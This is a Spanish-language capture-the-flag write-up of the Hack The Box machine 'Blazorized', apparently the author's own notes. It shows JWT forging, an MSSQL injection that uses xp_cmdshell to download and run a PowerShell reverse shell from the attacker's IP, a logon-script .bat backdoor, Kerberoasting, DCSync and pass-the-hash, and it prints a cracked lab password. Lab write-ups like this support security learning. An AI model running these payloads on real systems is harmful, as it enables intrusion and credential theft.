# Blazorized

Tags: [[_sqli]],[[_webExploitation]],[[_dc]],[[_permissionAbuse]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Windows</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
En este caso <span style="color:#07b4f2">no buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

Son <span style="color:#07b4f2">muchos</span> <span style="color:#ff669c">puertos</span> abiertos, iremos <span style="color:#ff2dc0">enumerando</span> <span style="color:#07b4f2">de a poco</span>.

<span style="color:#ff669c">80</span> - HTTP.
<span style="color:#ff669c">1433</span> - MSSQL.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ecacb6">blazorized.htb</span> lo <span style="color:#07b4f2">contemplamos</span> en el <span style="color:#ecacb6">/etc/hosts</span>

<span style="color:#ff669c">80</span>.
<span style="color:#ff2dc0">whatweb</span>. Un <span style="color:#ff2dc0">IIS</span>.
<span style="color:#ff2dc0">Web</span> hecha <span style="color:#07b4f2">con</span> <span style="color:#ff2dc0">Blazor WebAssembly</span>.
<span style="color:#07b4f2">Cosas</span> interesantes que <span style="color:#ff2dc0">enumerar</span>.

En un <span style="color:#07b4f2">apartado</span> de ver actualizaciones encontramos
<span style="color:#ecacb6">api.blazorized.htb</span> 
Cuando le <span style="color:#07b4f2">damos</span> a <span style="color:#07b4f2">checar</span>, nos <span style="color:#07b4f2">carga</span> más <span style="color:#07b4f2">contenido</span>. <span style="color:#07b4f2">Además</span>, como ahí mismo dice, <span style="color:#07b4f2">puedo</span> <span style="color:#ff2dc0">impersonar</span> al <span style="color:#ecacb6">admin</span> para <span style="color:#07b4f2">hacer</span> dicha <span style="color:#ff2dc0">petición</span>, usamos su <span style="color:#ff2dc0">token</span>, lo <span style="color:#ff2dc0">decodeamos</span> también, <span style="color:#07b4f2">no</span> tiene <span style="color:#07b4f2">mucho</span>.

En <span style="color:#ff2dc0">BurpSuite</span>, vemos <span style="color:#ff2dc0">peticiones</span> que <span style="color:#07b4f2">se realizan sobre</span> <span style="color:#ecacb6">admin.blazorized.htb</span>, hay <span style="color:#07b4f2">información</span> serializada que <span style="color:#07b4f2">vemos</span> en las <span style="color:#ff2dc0">respuestas</span>. Así que <span style="color:#07b4f2">usando</span> la <span style="color:#ff2dc0">extensión</span> <span style="color:#ecacb6">Blazor Traffic Processor</span>, podemos <span style="color:#07b4f2">pasarle</span> dicha <span style="color:#ff2dc0">data</span> para que nos la <span style="color:#07b4f2">represente bien</span>.

También, en la parte de <span style="color:#ecacb6">Target</span> -> <span style="color:#ecacb6">Site map</span>
Podemos ver las <span style="color:#ff2dc0">peticiones</span> hechas a <span style="color:#ecacb6">blazorized.htb</span>, y vemos varias que se realizan por detrás.
Nos <span style="color:#07b4f2">descargamos todas</span> las <span style="color:#ff2dc0">DLL</span>.
<span style="color:#ecacb6">/_framework/Blazorized.Helpers.dll</span>, es la <span style="color:#07b4f2">primera</span> que <span style="color:#07b4f2">sale</span> al <span style="color:#07b4f2">entrar a</span> <span style="color:#ecacb6">Check for Updates</span>, la <span style="color:#ff2dc0">decompilamos</span>. (<span style="color:#379075">Lo vimos desde burp, pero la idea es verlas desde un Windows</span>).
Podemos <span style="color:#ff2dc0">decompilarla</span> <span style="color:#07b4f2">usando</span> <span style="color:#ff2dc0">Avalonia ILSpy</span>.

Tenemos.
<span style="color:#ecacb6">admin.blazorized.htb</span> -> <span style="color:#ff2dc0">subdomain</span>.
Una <span style="color:#ff2dc0">cadena</span> como una <span style="color:#ff2dc0">key</span>, que<span style="color:#07b4f2"> tiene que ver</span> con un <span style="color:#ff2dc0">JWT</span>.
<span style="color:#ecacb6">superadmin@blazorized.htb </span>-> <span style="color:#ff2dc0">email</span>.
Y demás <span style="color:#07b4f2">información</span> que utilizaremos (<span style="color:#379075">está como junta, pero es ver el primero dato, y seguimos con lo demás</span>).

En <span style="color:#ecacb6">admin.blazorized.htb</span> hay un panel de <span style="color:#ff2dc0">login</span>.
<span style="color:#07b4f2">Tratemos</span> la <span style="color:#ff2dc0">cadena</span> he <span style="color:#07b4f2">información</span> que conseguimos. Esto para <span style="color:#07b4f2">conseguir</span> un <span style="color:#ff2dc0">JWT</span> válido.

<span style="color:#bef202">Opción 1</span>.
<span style="color:#07b4f2">Seguimos</span> el siguiente <span style="color:#ff2dc0">script</span>.
<span style="color:#07b4f2">Ajustamos</span> las <span style="color:#ff2dc0">variables</span> a la información que tenemos.
![[Pasted image 20241108213910.png]]
![[Pasted image 20241108214017.png]]
![[Pasted image 20241108214033.png]]

<span style="color:#ff2dc0">Ejecutarlo</span>.
![[Pasted image 20241108195324.png]]
Nos <span style="color:#07b4f2">quedamos con</span> el de <span style="color:#ecacb6">Temporary JWT</span>.
Vamos al <span style="color:#ecacb6">jwt.io</span> y lo <span style="color:#ff2dc0">decodeamos</span>, en la parte de <span style="color:#ff2dc0">verificar signature</span> colocamos el <span style="color:#07b4f2">valor</span> del <span style="color:#ff2dc0">key</span>, <span style="color:#ecacb6">8697...</span>
Y <span style="color:#ff2dc0">seteamos</span><span style="color:#ecacb6"> "exp": 1740000000</span>
<span style="color:#379075">Aunque en realidad no haría falta</span>.

<span style="color:#bef202">Opción 2</span>. 
Crearlo en la siguiente <span style="color:#07b4f2">página</span>
http://jwtbuilder.jamiekurtz.com/?ref=benheater.com

<span style="color:#ff2dc0">Standard JWT Claims</span>.
<span style="color:#ecacb6">Issued At</span> -> <span style="color:#ecacb6">now</span>
<span style="color:#ecacb6">Expiration</span> -> <span style="color:#ecacb6">In 1 year</span>
![[Pasted image 20241109161156.png]]

<span style="color:#ff2dc0">Additional Claims</span>.
¿Recordamos el <span style="color:#ff2dc0">token</span> del <span style="color:#ecacb6">admin</span> <span style="color:#07b4f2">que</span> <span style="color:#ff2dc0">impersonábamos</span>?. el que veíamos al <span style="color:#07b4f2">checar actualizaciones</span>, pues en ese <span style="color:#07b4f2">tenía</span><span style="color:#ff2dc0"> Claim Types</span>, los <span style="color:#07b4f2">colocamos</span>, y <span style="color:#07b4f2">ponemos</span> los <span style="color:#07b4f2">valores</span> importantes.
![[Pasted image 20241109161308.png]]

<span style="color:#ff2dc0">Signed JSON Web Token</span>.
<span style="color:#ecacb6">Key</span>, <span style="color:#ecacb6">HS512</span>, <span style="color:#ecacb6">Create Signed JWT</span>.
![[Pasted image 20241109161455.png]]

<span style="color:#07b4f2">Quedaría</span> así
![[Pasted image 20241109161819.png]]

<span style="color:#bef202">Opción 3</span>.
<span style="color:#07b4f2">Usando</span> <span style="color:#ff2dc0">python</span> de esta manera (<span style="color:#379075">o crearlo en un script</span>)
![[Pasted image 20241112225302.png]]


Vamos a la <span style="color:#ff2dc0">terminal</span> del navegador en el <span style="color:#ff2dc0">login</span>.
<span style="color:#88c425">localStorage.removeItem('jwt');</span>
<span style="color:#88c425">localStorage.setItem('jwt', 'token');</span>

---
Como <span style="color:#07b4f2">nada</span> es <span style="color:#07b4f2">perfecto</span>, aquí hay cosas que debemos <span style="color:#07b4f2">tener</span> en <span style="color:#07b4f2">cuenta</span>.
<span style="color:#ecacb6">1.-</span> La <span style="color:#07b4f2">segunda o tercer forma</span> de <span style="color:#07b4f2">crear</span> el <span style="color:#ff2dc0">JWT</span> es <span style="color:#07b4f2">mejor</span>.
<span style="color:#ecacb6">2.-</span> Probamos a <span style="color:#07b4f2">meter</span> el <span style="color:#ff2dc0">JWT</span> en <span style="color:#ecacb6">blazorized.htb</span>, <span style="color:#07b4f2">después</span> lo hacemos <span style="color:#07b4f2">en</span> <span style="color:#ecacb6">admin.blazorized.htb</span>

---
Una vez <span style="color:#07b4f2">dentro</span>, <span style="color:#ff2dc0">enumeramos</span> de todo.
Nos comentan que <span style="color:#07b4f2">no</span> <span style="color:#ff2dc0">consumimos</span> la <span style="color:#ff2dc0">API</span> estando como <span style="color:#ecacb6">admin</span>, sino que<span style="color:#07b4f2"> hablamos con</span> la <span style="color:#ff2dc0">DataBase</span> <span style="color:#07b4f2">directamente</span>, cuidado.

Hay un <span style="color:#07b4f2">apartado</span> de checar títulos duplicados, y como son <span style="color:#ff2dc0">consultas</span> a la <span style="color:#ff2dc0">base de datos</span>, podemos <span style="color:#07b4f2">probar cosas</span>.
El <span style="color:#ff2dc0">campo</span> es <span style="color:#ff2dc0">vulnerable</span> a <span style="color:#ff2dc0">SQLI</span>.
Recordando que está el <span style="color:#ff2dc0">MSSQL</span>, y al investigar encontramos que hay una <span style="color:#07b4f2">forma</span> de <span style="color:#ff2dc0">ejecutar comandos</span>, probemos cosas.
<span style="color:#ecacb6">test' EXEC xp_cmdshell "ping 10.10.14.107"-- -</span> :    me <span style="color:#07b4f2">llegan</span> los <span style="color:#ff2dc0">ping</span>.

Nos hacemos una <span style="color:#ff2dc0">petición</span> a <span style="color:#07b4f2">nuestro</span> <span style="color:#ff2dc0">servidor</span> que montemos, y <span style="color:#ff2dc0">servimos</span> un <span style="color:#ff2dc0">script</span> en <span style="color:#ff2dc0">PS</span> que al <span style="color:#07b4f2">interpretarlo</span> con <span style="color:#ff2dc0">IEX</span> en la máquina víctima, nos <span style="color:#07b4f2">de</span> una <span style="color:#ff2dc0">shell</span>. 
Como vimos al investigar, lo mejor es <span style="color:#07b4f2">agregar</span> algunos <span style="color:#ff2dc0">parámetros</span> para que <span style="color:#07b4f2">se</span> <span style="color:#ff2dc0">interprete</span> todo bien, introducimos lo siguiente
<span style="color:#ecacb6">test' EXEC xp_cmdshell "echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.107/RevPS.ps1') | powershell -noprofile"-- -</span>

Y pa deeeentro.


<span style="color:#ff669c">1433</span>.
<span style="color:#ff2dc0">Enumerar</span>.
https://medium.com/@oumasydney2000/mssql-enumeration-1433-1ee5fa6ac5d3
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-command-execution/#summary

Sin embargo, <span style="color:#07b4f2">no</span> <span style="color:#ff2dc0">enumeramos</span> mucho desde fuera.
<span style="color:#bef202">Vamos al 80</span>.


## Escalada

Enumerar todo el sistema.
Estamos como el usuario <span style="color:#ecacb6">NU_1055</span>

Hay <span style="color:#07b4f2">varios</span> <span style="color:#ecacb6">usuarios</span> a nivel de <span style="color:#ff2dc0">Dominio</span>.
Los metemos un diccionario para <span style="color:#07b4f2">probar</span> un <span style="color:#ff2dc0">ASREPRoast</span>. Pero <span style="color:#07b4f2">no se puede</span> con <span style="color:#07b4f2">ninguno</span>.

En <span style="color:#ecacb6">C:\Windows\SYSVOL\domain\scripts</span> tenemos <span style="color:#ff2dc0">directorios</span> <span style="color:#07b4f2">con</span> <span style="color:#ff2dc0">scripts</span> <span style="color:#ecacb6">.bat</span>, hay que encontrar los que no estén vacíos.

No encontramos muchas cositas, lo mejor será <span style="color:#ff2dc0">enumerar</span> <span style="color:#07b4f2">con</span> <span style="color:#ff2dc0">BloodHound</span>.
<span style="color:#07b4f2">Generamos</span> el <span style="color:#ff2dc0">comprimido</span> de la <span style="color:#07b4f2">información</span> del <span style="color:#ff2dc0">dominio</span> y nos lo traemos.
Lo <span style="color:#07b4f2">añadimos al</span> <span style="color:#ff2dc0">BloodHound</span> y <span style="color:#07b4f2">analizamos</span> todo.

Vamos al usuario <span style="color:#ecacb6">NU_1055</span> (<span style="color:#379075">le damos doble click</span>) -> <span style="color:#ecacb6">Node Info</span> -> <span style="color:#ecacb6">Outbound Object Control</span> (<span style="color:#ecacb6">First Degree Object Control</span>).
Podemos hacer un <span style="color:#ff2dc0">WriteSPN</span> <span style="color:#07b4f2">sobre</span> el usuario <span style="color:#ecacb6">RSA_4810</span>
<span style="color:#ecacb6">1.-</span> Le <span style="color:#07b4f2">asignamos</span> un <span style="color:#ff2dc0">SPN</span> al <span style="color:#ecacb6">usuario</span>.
<span style="color:#ecacb6">2.-</span> <span style="color:#07b4f2">Solicitamos</span> un <span style="color:#ff2dc0">service ticket</span> para <span style="color:#07b4f2">dicho</span> <span style="color:#ff2dc0">SPN</span>.
<span style="color:#ecacb6">3.-</span> Subimos el <span style="color:#ff2dc0">mimikatz.exe</span> para <span style="color:#07b4f2">obtener</span> un <span style="color:#ecacb6">.kirbi</span>
<span style="color:#ecacb6">4.-</span> <span style="color:#ff2dc0">kirbi2john</span> para <span style="color:#07b4f2">obtener</span> un <span style="color:#ff2dc0">hash</span> y <span style="color:#ff2dc0">crackearlo</span>.
<span style="color:#379075">En el apartado de "Enumerar en BloodHound" vemos cómo llevarlo a cabo</span>.
Obtenemos la <span style="color:#07b4f2">password</span> de <span style="color:#ecacb6">RSA_4810</span>
<span style="color:#ecacb6">RSA_4810:(Ni7856Do9854Ki05Ng0005 #)</span>

Nos <span style="color:#07b4f2">conectamos</span> con <span style="color:#ff2dc0">evil-winrm </span>con dichas <span style="color:#ff2dc0">credenciales</span>.
<span style="color:#07b4f2">Checamos</span> nuevamente en <span style="color:#ff2dc0">BloodHound</span>.
<span style="color:#ecacb6">Analysis</span> -> <span style="color:#ecacb6">Dangerous Privileges</span> (<span style="color:#ecacb6">Find Principals with DCSync Rights</span>).
Vemos varios <span style="color:#07b4f2">usuarios</span>, entre ellos el <span style="color:#ecacb6">SSA_6010</span> (<span style="color:#379075">que tiene su directorio en C:\Users</span>)

Subimos el <span style="color:#ecacb6">PowerView.ps1</span> <span style="color:#379075">(usaremos sus funciones</span>), importamos el módulo y <span style="color:#ff2dc0">enumeramos</span> el usuario <span style="color:#ecacb6">SSA_6010</span> y de todo.
<span style="color:#88c425">Get-DomainUser ssa_6810</span> y vemos que <span style="color:#ff2dc0">inicia sesión</span> cada <span style="color:#07b4f2">minuto</span>.
Hay una <span style="color:#ff2dc0">función</span> interesante 
<span style="color:#88c425">Find-InterestingDomainAcl</span> :    para ver <span style="color:#ff2dc0">propiedades</span> que podemos<span style="color:#07b4f2"> alterar como</span> el <span style="color:#ecacb6">usuario</span> actual <span style="color:#07b4f2">en</span> el <span style="color:#07b4f2">que estamos</span>.
Tenemos <span style="color:#07b4f2">sobre</span><span style="color:#ecacb6"> SSA_6010</span>
<span style="color:#ecacb6">ActiveDirectoryRights : WriteProperty</span>
<span style="color:#ecacb6">ObjectAceType : Script-Path</span>

<span style="color:#ecacb6">Script-Path</span> es <span style="color:#07b4f2">delicado</span>, porque podemos <span style="color:#07b4f2">modificar</span> lo que <span style="color:#07b4f2">queremos</span> que el <span style="color:#ecacb6">usuario</span> <span style="color:#07b4f2">haga</span> en el <span style="color:#ff2dc0">inicio de sesión</span>.
Por lo<span style="color:#07b4f2"> regular está en</span> <span style="color:#ecacb6">SYSVOL</span>.
<span style="color:#07b4f2">Recordando</span> los <span style="color:#ecacb6">.bat</span> que habíamos <span style="color:#07b4f2">encontrado</span>, ya podemos entenderlos mejor.
<span style="color:#ecacb6">C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts</span>

<span style="color:#88c425">icacls *</span> :    vemos que <span style="color:#07b4f2">en uno tenemos</span> <span style="color:#ff2dc0">control total </span>y de <span style="color:#07b4f2">forma</span> <span style="color:#ff2dc0">recursiva</span>.
Todo <span style="color:#07b4f2">lo que cree</span> dentro del <span style="color:#ecacb6">directorio</span>, <span style="color:#07b4f2">se</span> <span style="color:#ff2dc0">ejecutará</span> cuando el <span style="color:#ecacb6">usuario</span> <span style="color:#ff2dc0">inicie sesión</span>.
Así que <span style="color:#07b4f2">podríamos</span> ir a <span style="color:#ecacb6">revshells.com</span> y <span style="color:#07b4f2">crear</span> un <span style="color:#ff2dc0">payload</span> en <span style="color:#ff2dc0">PS</span> (<span style="color:#ff2dc0">base64</span>) para entablarnos una <span style="color:#ff2dc0">reverse shell</span>. <span style="color:#379075">Para variarle, porque se puede de muchas maneras</span>.
<span style="color:#88c425">echo 'payloadPSBase64' | Out-File -FilePath reverse.bat -Encoding ASCII</span> :    <span style="color:#07b4f2">dentro</span> del <span style="color:#ff2dc0">directorio</span> con <span style="color:#ff2dc0">permisos</span> de <span style="color:#ff2dc0">escritura</span>.

Pero <span style="color:#07b4f2">falta</span> algo, al <span style="color:#07b4f2">hacer</span>
<span style="color:#88c425">Get-ADUSer ssa_6010 -Properties ScriptPath</span> :    vemos que el <span style="color:#ecacb6">ScriptPath</span> está <span style="color:#07b4f2">vacío</span>,<span style="color:#07b4f2"> porque parte de</span> la <span style="color:#ff2dc0">ruta</span> <span style="color:#ecacb6"> C:\...\scripts</span>, es decir, ya <span style="color:#07b4f2">toma ese</span> <span style="color:#ff2dc0">directorio</span>, pero me <span style="color:#07b4f2">falta</span> que <span style="color:#07b4f2">conozca</span> el <span style="color:#ecacb6">.bat</span> que <span style="color:#07b4f2">creamos</span>, hacemos
<span style="color:#88c425">Get-ADUSer ssa_6010 | Set-ADUSer -ScriptPath A32FF3AEAA23\reverse.bat</span>

Sería cuestión de <span style="color:#07b4f2">esperar</span> y <span style="color:#07b4f2">nos convertimos en</span> <span style="color:#ecacb6">SSA_6010</span>.
Ya habíamos visto que podemos <span style="color:#07b4f2">hacer</span> un <span style="color:#ff2dc0">DCSync</span> <span style="color:#07b4f2">sobre</span> el <span style="color:#ff2dc0">dominio</span>, <span style="color:#ecacb6">blazorized.htb</span>, <span style="color:#07b4f2">esto por</span> los <span style="color:#ff2dc0">permisos</span> de <span style="color:#ecacb6">GetChangesAll</span> y <span style="color:#ecacb6">GetChanges</span>.
<span style="color:#ecacb6">1.-</span> Subimos el <span style="color:#ecacb6">mimikatz.exe</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#ecacb6">2.-</span> Lo <span style="color:#ff2dc0">ejecutamos</span> para <span style="color:#07b4f2">obtener</span> el <span style="color:#ff2dc0">Hash NTLM</span> del <span style="color:#ecacb6">Administrator</span>.
<span style="color:#ecacb6">3.-</span> Empleamos el <span style="color:#ecacb6">Hash</span> para <span style="color:#07b4f2">conectarnos</span> con <span style="color:#ff2dc0">evil-winrm</span> haciendo <span style="color:#ff2dc0">Pass The Hash</span>.
<span style="color:#379075">En el apartado de "Enumerar en BloodHound" vemos cómo llevarlo a cabo</span>

Y pa deeeeeeeeentro.
FIN.
